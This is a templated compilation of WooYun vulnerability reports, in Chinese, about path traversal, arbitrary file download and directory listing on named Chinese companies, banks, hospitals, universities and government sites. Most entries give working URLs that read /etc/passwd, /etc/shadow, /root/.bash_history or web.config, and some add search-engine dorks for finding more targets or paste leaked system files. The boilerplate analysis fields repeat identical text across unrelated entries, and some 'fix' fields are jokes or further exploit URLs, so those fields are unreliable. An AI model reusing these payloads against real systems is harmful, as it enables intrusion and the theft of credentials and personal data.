**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 重庆三峡中心医院http://**.**.**.**/通过总院可以控制平湖分院、百安分院、妇儿分院、御安分院、急救分院、肿瘤分院、口腔分院，所有目录遍历，后台越权访问，添加、修改、删除、上传等权限。中心医院分院

**POC**: (见原文)

**绕过**: 直接利用

**修复**: RT
---

---
### [wooyun-2012-08243] 国家电网某站点任意文件下载
**厂商**: 国家电网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://zhaopin.sgcc.com.cn/views/contents/common/download.jsp?filename=https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/FileUploadback/HR_BULLETIN/20120120145058.doc其中文件下载路径参数filename没有对路径进行必要的限制！

**POC**: http://zhaopin.sgcc.com.cn/views/contents/common/download.jsp?filename=/views/contents/common/download.jsphttp://zhaopin.sgcc.com.cn/views/contents/common/download.jsp?filename=/login.jsp.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2016-0200322] 东风日产某站某漏洞涉及上万客户信息
**厂商**: 东风日产乘用车公司 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 东风日产商用车客户互动平台http://cip.dongfeng-nissan.com.cn存在目录遍历问题

**POC**: 关键文件泄露目录 http://cip.dongfeng-nissan.com.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Attachment/辣么多文件源码读取下来统计下多少个文件17627个文件顺便点开两个-然后 你们客户的各种信息就泄露啦~~秘密也就不再秘密啦

**绕过**: 直接利用

**修复**: 加个index文件 或者设置成403吧
---

---
### [wooyun-2014-055484] 中彩网某分站源码下载及发现黑链
**厂商**: 中彩网 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历：http://home.zhcw.com/下载源码：http://home.zhcw.com/expert20121210.tar.gz

**POC**: 被植入大量黑链：百家乐技巧,摩卡线上娱乐,白山在线棋牌游戏,外围赌博【太子娱乐城 ...www.zhcw.com/oldnews/news/zjssq/1225/192.shtml?2013年12月25日 - 百家乐技巧,摩卡线上娱乐,白山在线棋牌游戏,外围赌博。当晚全国中出18注一等奖，单注奖金高达654万元，其中一注落户于广西省河池市。 近日，这 ...真人百家乐,真人百家乐开户,海尔娱乐城,亲朋棋牌官网,十三张 ... - 中彩网www.zhcw.com/oldnews/news/zjssq/1225/158.shtml?2013年12月25日 - 刚才我正好路过的时候,我就透过房门上的

**绕过**: 直接利用

**修复**: 修改web配置，删除被黑页面。
---

---
### [wooyun-2013-020264] 武汉农村商业银行任意文件下载漏洞
**厂商**: 武汉农村商业银行 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: （1）、目录遍历漏洞：http://www.whrcbank.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/http://www.whrcbank.com/Images/（2）、任意文件下载漏洞：http://www.whrcbank.com/downLoad?fileName=201206191739000041.doc

**POC**: 任意文件下载漏洞证明：1、http://www.whrcbank.com/downLoad?fileName=../bottom.jsp2、http://www.whrcbank.com/downLoad?fileName=../news.jsp目录遍历漏洞证明：

**绕过**: 直接利用

**修复**: 省略。
---

---
### [wooyun-2014-087935] 某政府采购系统通用型任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百度搜索 inurl:IndexViewController.do?method=indexhttp://www.lazfcg.gov.cn/huoshan/IndexViewController.do?method=indexhttp://www.hszgj.cn/IndexViewController.do?method=indexhttp://kszfcg.gov.cn/IndexViewController.do?method=indexhttp://www.szzfcg.gov.cn/IndexViewController.do?method=indexhttp://www.ydzfcg.gov.cn/IndexViewController.do?method=indexhttp://ztb.taihe.gov.cn/IndexViewController.do?method=i

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-014284] 鞍钢官方站点任意文件下载
**厂商**: 鞍钢集团 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.ansteel.com.cn/main/down.jsp页面对filePath参数没有任何过滤导致任意文件下载漏洞http://www.ansteel.com.cn/main/down.jsp?filePath=/../../../../../../../../../../../../../../../etc/shadow&fileName=1.txt

**POC**: (见原文)

**绕过**: 直接利用

**修复**: http://www.ansteel.com.cn/main/down.jsp?filePath=/../../../../../../../../../../../../../../../etc/passwd&fileName=1.txt
---

---
### [wooyun-2011-02817] qun.qq.com文件包含导致任意文件读取
**厂商**: 腾讯 | **年份**: 2011 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://qun.qq.com/air/?w=n&c=/../../../../../../../../../../../etc/passwd%00.html&a=dismiss&g=

**POC**: http://qun.qq.com/air/?w=n&c=/../../../../../../../../../../../etc/passwd%00.html&a=dismiss&g=

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-010025] 丁丁网部分子网站存在多处任意文件下载
**厂商**: 丁丁网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mobile.ddmap.com/downloadfun.jsp?filename=downloadfun.jsp点开就是说明google搜索相应关键词还能发现更多  不一一展示

**POC**: 图是2011年截图的，最近看到有人提交这个网站的，看了下问题依旧，重新截图都省了这公司真行。

**绕过**: 直接利用

**修复**: 技术不重要多点认真的工作态度。多点责任感。
---

---
### [wooyun-2015-0130116] 搜狐某站点存在任意文件读取漏洞
**厂商**: 搜狐 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 低于3.10版本的resin中某模块默认存在一个任意文件读取漏洞

**POC**: http://220.181.90.223:8090//resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/hostshttp://220.181.90.223:8090//resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd

**绕过**: 直接利用

**修复**: 升级到最新版本
---

---
### [wooyun-2015-0145066] 石家庄地铁官网存在任意文件下载漏洞
**厂商**: 石家庄地铁 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 【获取网站路径】http://**.**.**.**/cyportal2.3/DownloadTemplateFile?operate=all全部模板导出成功 请保存!,template 2015-10-06 19:37:56.xml,D:/newhero/apache-tomcat-7.0.30/webapps/cyportal2.3/TempFile/【下载web,xml】**.**.**.**/cyportal2.3/DownloadServlet?filePath=D:/newhero/apache-tomcat-7.0.30/webapps/cyportal2.3/WEB-INF/&templateName=web.xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-071155] 海南省某政府网站重要信息泄露
**厂商**: http://www.sanya.gov.cn | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.某天闲的蛋疼就想到三亚，这是一个好地方呀，各种土豪。于是在官网搜索框处随手输入一个“root”，结果出现txt文件，果断查看之http://www.sanya.gov.cn/publicfiles/business/htmlfiles/mastersite/cmsmedia/document/2012/10/doc9445.txt2.查看txt文件

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除txt文件，各服务器查一下马吧，疑被人搞进了。
---

---
### [wooyun-2013-031843] 金蝶某分站sql数据备份文件下载
**厂商**: 金蝶 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://dmp.kingdee.com/bak/sql.rar

**POC**: http://dmp.kingdee.com/bak/sql.rar

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2013-040704] siteserver 3.6.4 目录遍历漏洞
**厂商**: 百容千域软件技术开发有限责任公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 普通用户可直接访问siteserver/cms/background_fileTree.aspx?PublishmentSystemID=0&RootPath=&CurrentRootPath=include查看根目录下所有文件夹ewebeditor问题(如果生成XX.asp用户名可直接拿权限)SiteFiles/bairong/TextEditor/eWebEditor/

**POC**: 还有几个问题正在研究,稍后提交!

**绕过**: 直接利用

**修复**: 加强权限,
---

---
### [wooyun-2015-0126763] 某政务服务中心系统通用型任意文件下载
**厂商**: 深圳太极软件有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 深圳太极软件有限公司开发系统比较多；这款是政务服务中心系统；存在任意文件下载漏洞;这个系统的案例实在太多，都不需要我多说了~任意文件下载：/servlet/fileOpenforms?filename=/WEB-INF/WEB.xmlCase:http://**.**.**.**//servlet/fileOpenforms?filename=/WEB-INF/WEB.xmlhttp://**.**.**.**//servlet/fileOpenforms?filename=/WEB-INF/WEB.xml**.**.**.**/servlet/fileOpenforms?filename=/WEB-INF/WEB.xmlhttp://**.**.**.**/servlet/fileOpenforms?filename=/WEB-INF/WEB.xmlhttp://**.**.**.**:

**POC**: Security Testing:1、2、有的也能直接读取

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0148164] 民生银行某处配置不当可查看大量内部敏感信息
**厂商**: 中国民生银行 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址：http://exam.cmbc.com.cn/wis18/config/http://exam.cmbc.com.cn/wis18/system/http://exam.cmbc.com.cn/wis18https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/目录遍历，可查看数据库配置，查看内部上传的大量敏感信息（各地分行人员身份证号、联系电话、包含密码的转账支票信息、支款凭条、存款申请表、身份证复印件等等）。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: rank高点可好~
---

---
### [wooyun-2014-054167] 江苏人力资源和社会保障网任意文件下载
**厂商**: 江苏人力资源和社会保障网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.jshrss.gov.cn/Auditing/download.jsp?filename=../download.jsp

**POC**: www.jshrss.gov.cn/Auditing/download.jsp?filename=../download.jsp

**绕过**: 直接利用

**修复**: 禁止目录跨
---

---
### [wooyun-2015-0130893] 安徽大学主站任意文件下载
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件名base64编码后可任意下载，为了验证已下载了/root/.bash_history，/WEB-INF/web.xml，/etc/passwd，/etc/hosts

**POC**: 编码前http://wyzx.ahu.edu.cn/download.jsp?file=/root/.bash_historyhttp://wyzx.ahu.edu.cn/download.jsp?file=/WEB-INF/web.xmlhttp://wyzx.ahu.edu.cn/download.jsp?file=/etc/passwdhttp://wyzx.ahu.edu.cn/download.jsp?file=/etc/hostsbase64后http://wyzx.ahu.edu.cn/download.jsp?file=L3Jvb3QvLmJhc2hfaGlzdG9yeQ==h

**绕过**: 编码绕过

**修复**: 过滤，限制下载权限吧
---

---
### [wooyun-2014-071121] 已交往敏感文件下载导致root等信息泄漏
**厂商**: eduease.com | **年份**: 2014 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://www.eduease.com/data.rar下载以后解压查看发现两个文件夹，mysql和eduease，目测eduease是网站的数据文件mysql中找到user.myd 用c32asm打开发现root密码eduease中发现studyease_admin.MYD找到管理员账号密码studyease_user.MYD中找到教师们的相关信息由于我这台电脑没装mysql 所以就用C32Asm打开证明下而已还有好多信息就不发了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除根目录下的data.rar文件及时修改root密码和网站管理员账户密码
---

---
### [wooyun-2013-043983] 国家电网#某分站存在IIS读写及目录遍历漏洞
**厂商**: 国家电网公司 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：http://bid2.ha.sgcc.com.cn漏洞路径：http://bid2.ha.sgcc.com.cn/upgrade还存在IIS6.0解析漏洞，未深入http://bid2.ha.sgcc.com.cn/upgrade/acu_test_QXhf9.asp;.jpg目录遍历：http://bid2.ha.sgcc.com.cn/WebServicehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/errorlog

**POC**: 已经证明

**绕过**: 直接利用

**修复**: 升级IIS版本，打补丁。
---

---
### [wooyun-2013-041987] 中粮集团某分站任意文件读取
**厂商**: 中粮集团有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST /index.php?app=home&mod=Index&act=subapp HTTP/1.1Host: haoshiku.cofco.comAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeReferer: http://haoshiku.cofco.com/index.php?app=home&mod=Index&act=subappCookie: haoshiku_think_language=en; SPHPSESSID=cbnd2e2sefa0r0os4l9n4evea5; haoshiku_refer_url=%2Findex.php%3Fapp%3

**POC**: 两张为burp抓包的截图

**绕过**: 直接利用

**修复**: 过滤变量即可
---

---
### [wooyun-2014-062598] 某通用性CMS任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 出现这个漏洞的webcms是湖南爱瑞杰科技发展股份有限公司网上能找到非常多的例子。另外，在footer还能找到一个上海心通技术有限公司协助制作实际上为同一家公司，通过该漏洞我down回来的源码对比其实是一样的。仅仅版权不一样（copy的同时把别人的漏洞也拷贝过来了？呵呵）先看实例1：http://jyj.nanyue.gov.cn/jyxx/manage/download.aspx?File=../web.configgoogle hack发现方式：site:gov.cn inurl:download.aspx manage Filesite:cn inurl:download.aspx manage Filesite:net inurl:download.aspx manage Filesite:com inurl:download.aspx manage File去重之后还是有几十个网

**POC**: http://jyj.nanyue.gov.cn/jyxx/manage/download.aspx?File=../web.configwww.czsz.cn/manage/download.aspx?File=../web.confighttp://www.shixi.stn.sh.cn/manage/download.aspx?File=../web.configwww.yzbzxx.cn/manage/download.aspx?File=../web.configwww.lqschool.cn/manage/download.aspx?File=../web.configwww.tj

**绕过**: 直接利用

**修复**: 限制用户传入的参数以及下载的后缀。最好是白名单控制。
---

---
### [wooyun-2014-060613] 某OA系统存在多个任意文件下载漏洞（泄漏数据库相关信息）
**厂商**: 某OA | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在上面的信息就不明说是什么OA了，因为漏洞点太明显了，怕对官方造成小影响。官网：http://www.smartoa.com.cn/OA的名词就叫smartoa存在四个任意文件下载漏洞，可获取数据库的信息一个实例：http://www.ccblxn.com/file/EmailDownload.ashx?url=~/web.config&name=web.config

**POC**: 每个点都是在不同的dll里面的。每个dll里面都有自己独立的文件下载函数和调用这个函数的函数，厂商自己理一下吧。第一处：http://demo.smartoa.com.cn/file/EmailDownload.ashx?url=~/web.config&name=web.config数据库连接密码已经打码了：第二处：http://demo.smartoa.com.cn/file/UDFDownLoad.ashx?path=~/web.config&name=web.config第三处：http://demo.smartoa.com.cn/file/DownLoad.ashx?path=~/R

**绕过**: 直接利用

**修复**: 过滤下+限制文件夹。
---

---
### [wooyun-2015-0130663] 某省政府采购网任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 河北省政府采购网文件下载处可导致任意文件下载

**POC**: 采购新闻处可下载任意文件

**绕过**: 直接利用

**修复**: 限制下载目录
---

---
### [wooyun-2013-037428] 逐浪网主站任意文件下载漏洞
**厂商**: zhulang.com | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.zhulang.com/w_book_info.php?bookid=192883&c=../../../../../../../../../../etc/passwd%00.jpg

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019195] 湖南卫视旗下某站任意文件读取
**厂商**: 湖南卫视 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天媳妇在金鹰卡通看猫和老鼠，我就上他们网站看了一下，一瞅，吓了一跳。phpcms v9的phpcms\modules\search\index.php存在任意文件读取漏洞在url后面加上/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php就报出了mysql的信息。

**POC**: mysql的各种信息都出来了，由于mysql服务器是内网，所以只选了五分。

**绕过**: 直接利用

**修复**: 安装补丁，你们懂了。我要礼物：我要快乐家族和天天兄弟的签名照。
---

---
### [wooyun-2014-065697] 国家数字中心KDM系统(数字证书管理及密钥制作服务系统)任意文件下载
**厂商**: 国家数字中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家数字中心KDM系统任意文件下载http://www.kdmchina.org/downHelpServlet?fileName=../../../../../../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 他们懂的
---

---
### [wooyun-2014-077439] 万户OA所有版本任意文件下载
**厂商**: 万户网络 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 万户OAdownload_old.jsp文件可以任意访问，导致无需登录，下载任意文件测试URL：/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml快下班了，时间不够了，测试地址就不贴了，自行测试哈。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 常规修复。。。
---

---
### [wooyun-2015-0111056] 时光网某台服务器任意文件读取（root密码hash泄露）
**厂商**: 时光网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不能直接在浏览器上访问，需要使用一些请求发送工具，不会把../取消掉的。可以使用fiddler的composer测试http://59.151.32.24/../../../../../../../../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinsaslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/n

**POC**: 见详细

**绕过**: 直接利用

**修复**: 看李姐姐的博客http://www.lijiejie.com/python-django-directory-traversal/
---

---
### [wooyun-2015-0139992] 人人乐集团官网任意文件下载漏洞导致旗下所有商城商品信息泄漏（可读shadow）
**厂商**: 人人乐集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞所在链接：http://www.renrenle.cn/share/download.jsp?filePath=adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1342576091234.doc&fileName=1342576091234.doc通过修改文件路径实现任意文件下载：系统为linux，直接下载shadow文件：http://www.renrenle.cn/share/download.jsp?filePath=../../../../../../../../../../../etc/shadow&fileName=shadow可以直觉读取shadow，web服务权限比较高。通过读取源文件追踪到配置文件路径：/opt/jboss/server/default/deploy/ws.war/WEB-INF/w

**POC**: 漏洞所在链接：http://www.renrenle.cn/share/download.jsp?filePath=adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1342576091234.doc&fileName=1342576091234.doc通过修改文件路径实现任意文件下载：系统为linux，直接下载shadow文件：http://www.renrenle.cn/share/download.jsp?filePath=../../../../../../../../../../../etc/shadow&fileN

**绕过**: 编码绕过

**修复**: 逻辑过滤
---

---
### [wooyun-2014-077564] Dr.COM认证计费系统任意文件下载漏洞（多个名校）
**厂商**: Dr.COM认证计费系统 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Dr.COM认证计费系统（通用版）任意文件下载漏洞【官方demo测试也通过】如下：http://demo.doctorcom.com/DrcomManager/download.jsp?filename=&filepath=/etc/shadow可下载到/etc/shadow （经测试默认配置情况下，多个学习可以下载到/etc/shadow，可能是厂商给配置的时候就是root配置的。

**POC**: 多个名校使用

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0156696] 安徽省经信委会官网目录遍历漏洞#可获服务器任意文件
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这是第二处啊第二处。。。0x01 漏洞官网http://**.**.**.**/0x02 漏洞类型目录遍历，可以通过指定目录获取服务器上任意文件0x03 漏洞详细漏洞出现在以下地方http://**.**.**.**//aea/Download?strName=1.txt&strPath=../../../../../../../../../../etc/passwd

**POC**: 下载etc下passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmai

**绕过**: 直接利用

**修复**: 我不专业
---

---
### [wooyun-2015-0151767] 万科集团官网存在LFI漏洞
**厂商**: 万科集团 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、漏洞点：http://zhengzhou.vanke.com/file.php?file=2、跑了一下：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: Token过滤
---

---
### [wooyun-2013-028525] 中兴某管理系统目录遍历致内部资料外泄（设计图纸、资料等）
**厂商**: 中兴通讯股份有限公司 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中兴的供应商图纸管理下载外网管理系统http://mts.zte.com.cn/Mtsmap/CustomerLogin.aspx直接访问http://mts.zte.com.cn/Mtsmap/就会出现目录遍历，并且有许多rar压缩文件可供下载，许多涉及一些手机项目的参数以及许多手机及手机相关的图纸信息，等于是不需要任何权限下载这个供应商图纸管理系统里的所有文件图纸，访问授权形同虚设！其主界面是手机物料管理研发系统，虽然不登录无法访问，但是如上对其图纸、资料的任意下载使得整个界面是否可用并无实际意义，更像是摆设图纸以及项目文件资料具有很大的商业价值，望重视。

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-059769] 沂蒙先锋网被挂黑页
**厂商**: 沂蒙先锋 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.linyiyj.gov.cn/hack.txthttp://www.linyiyj.gov.cn/index.htm

**POC**: http://www.linyiyj.gov.cn/editor/目录还挺多的：

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0145554] 金融安全之西安贷未授权目录遍历（涉及身份证/房产证/银行流水/毕业证/工资证明/睡衣照）
**厂商**: 西安贷 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如下链接存在未授权访问，目录遍历漏洞http://www.xadai.com/UF/Uploads/MemberData/上传的会员各类信息，会在这里保存。其中有身份证、房产证、银行流水、毕业证、工资证明、居住证明、居然还有睡衣照！

**POC**: 转一转脑袋，治疗一下劲椎

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0150162] 某工商银行钓鱼获取用户大量信息/身份号/银行卡号/取款密码/等
**厂商**: 中国工商银行 | **年份**: 2015 | **类型**: 钓鱼欺诈信息

**元思考**: 触发信号: 功能测试

**洞察**: 钓鱼欺诈信息防护不足，开发者信任前端输入

**测试流程**:
1. 识别钓鱼欺诈信息相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/http://**.**.**.**/User/http://**.**.**.**/Inc/目录遍历

**POC**: 泄漏数据：

**绕过**: 直接利用

**修复**: 这个不懂，有关部门吧
---

---
### [wooyun-2014-068742] 久久建筑网任意文件下载
**厂商**: 久久建筑网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

